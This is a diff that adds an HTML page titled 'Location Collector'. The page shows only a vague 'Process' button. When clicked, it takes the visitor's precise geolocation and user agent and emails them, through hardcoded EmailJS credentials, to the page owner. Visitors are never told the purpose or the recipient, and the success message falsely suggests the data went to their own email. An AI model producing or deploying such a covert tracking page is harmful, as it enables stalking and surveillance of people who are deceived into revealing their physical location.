@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Collector</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 100%;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+            display: block;
+        }
+
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            display: block;
+        }
+
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+            display: block;
+        }
+
+        .location-info {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            display: none;
+        }
+
+        .location-info.show {
+            display: block;
+        }
+
+        .location-info h3 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+
+        .location-info p {
+            color: #666;
+            font-size: 14px;
+            margin: 5px 0;
+        }
+
+        .config-note {
+            margin-top: 20px;
+            padding: 15px;
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            border-radius: 10px;
+            font-size: 13px;
+            color: #856404;
+        }
+
+        .config-note strong {
+            display: block;
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <button id="shareBtn" onclick="getLocation()">Process</button>
+
+        <div id="status" class="status"></div>
+        <div id="locationInfo" class="location-info"></div>
+
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS with your public key
+        const EMAILJS_PUBLIC_KEY = 'g9Fqywb4zVD3uWFKf';
+        const EMAILJS_SERVICE_ID = 'service_pg5bzyr';
+        const EMAILJS_TEMPLATE_ID = 'template_dhrgc3w';
+
+        emailjs.init(EMAILJS_PUBLIC_KEY);
+
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+        }
+
+        function displayLocation(position) {
+            const locationDiv = document.getElementById('locationInfo');
+            const { latitude, longitude, accuracy } = position.coords;
+
+            locationDiv.innerHTML = `
+                <h3>Location Retrieved:</h3>
+                <p><strong>Latitude:</strong> ${latitude.toFixed(6)}</p>
+                <p><strong>Longitude:</strong> ${longitude.toFixed(6)}</p>
+                <p><strong>Accuracy:</strong> ±${accuracy.toFixed(0)} meters</p>
+                <p><strong>Google Maps:</strong> <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">View on Map</a></p>
+            `;
+            locationDiv.classList.add('show');
+        }
+
+        async function sendLocationEmail(position) {
+            const { latitude, longitude, accuracy } = position.coords;
+            const timestamp = new Date().toLocaleString();
+
+            const templateParams = {
+                latitude: latitude.toFixed(6),
+                longitude: longitude.toFixed(6),
+                accuracy: accuracy.toFixed(0),
+                timestamp: timestamp,
+                map_link: `https://www.google.com/maps?q=${latitude},${longitude}`,
+                user_agent: navigator.userAgent
+            };
+
+            try {
+                const response = await emailjs.send(
+                    EMAILJS_SERVICE_ID,
+                    EMAILJS_TEMPLATE_ID,
+                    templateParams
+                );
+
+                console.log('Email sent successfully:', response);
+                showStatus('✅ Location sent successfully to your email!', 'success');
+            } catch (error) {
+                console.error('Email send failed:', error);
+                showStatus('❌ Failed to send email. Please check your EmailJS configuration.', 'error');
+            }
+        }
+
+        function getLocation() {
+            const btn = document.getElementById('shareBtn');
+
+            if (!navigator.geolocation) {
+                showStatus('❌ Geolocation is not supported by your browser', 'error');
+                return;
+            }
+
+            btn.disabled = true;
+            btn.textContent = 'Getting Location...';
+            showStatus('📍 Requesting location permission...', 'info');
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    displayLocation(position);
+                    showStatus('📧 Sending location to email...', 'info');
+                    await sendLocationEmail(position);
+                    btn.disabled = false;
+                    btn.textContent = 'Process';
+                },
+                (error) => {
+                    let errorMessage = '';
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMessage = '❌ Location access denied. Click the 🔒 icon in address bar → Site settings → Location → Allow, then try again.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMessage = '❌ Location information unavailable. Please check your device settings.';
+                            break;
+                        case error.TIMEOUT:
+                            errorMessage = '❌ Location request timed out. Please try again.';
+                            break;
+                        default:
+                            errorMessage = '❌ An unknown error occurred. Please try again.';
+                    }
+                    showStatus(errorMessage, 'error');
+                    btn.disabled = false;
+                    btn.textContent = 'Process';
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+    </script>
+</body>
+
+</html>
